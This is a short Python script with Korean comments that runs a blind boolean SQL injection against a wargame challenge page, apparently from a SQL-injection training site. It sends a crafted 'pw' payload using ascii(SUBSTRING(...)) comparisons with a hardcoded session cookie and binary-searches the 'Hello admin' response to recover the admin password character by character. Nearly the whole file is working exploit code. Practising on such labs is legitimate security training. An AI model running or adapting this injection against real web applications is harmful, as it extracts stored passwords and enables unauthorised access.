import requests
from bs4 import BeautifulSoup

base_url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
cookies = {
    "PHPSESSID": "0km9dfpg41da70a5i68klqbjo4"
}
query_params = {
    'pw': ''
}

def fetch_first_character(query):
    low = 33  # ASCII 값의 최소 (공백 문자)
    high = 126  # ASCII 값의 최대 (~ 문자)
    
    while low <= high:
        mid = (low + high) // 2  # 이진 탐색을 위한 중간 값
        
        # SQL Injection 쿼리 설정 (첫 번째 문자만 추출)
        query_params['pw'] = f"'||id like 'admin'&&(ascii(SUBSTRING((select pw limit 0,1),1,1)) > {mid})||'"
        response = requests.get(base_url, cookies=cookies, params=query_params)
        soup = BeautifulSoup(response.text, "html.parser")
        result = soup.find('h2', string="Hello admin")
        if result:
            low = mid + 1  # 값이 더 클 경우, 범위 상향
        else:
            high = mid - 1  # 값이 더 작을 경우, 범위 하향
    
    # low 또는 high 값이 원하는 첫 번째 문자임
    first_char = chr(low)
    print(f"low: {low} (ASCII: {low}, Hex: {hex(low)})")
    print(f"첫 번째 문자: {first_char}")
    
    print(result)
    return first_char

if __name__ == "__main__":
    query = "select pw limit 0,1"  # 첫 번째 문자를 추출하기 위한 쿼리
    first_char = fetch_first_character(query)
    print(f"추출된 첫 번째 문자: {first_char}")
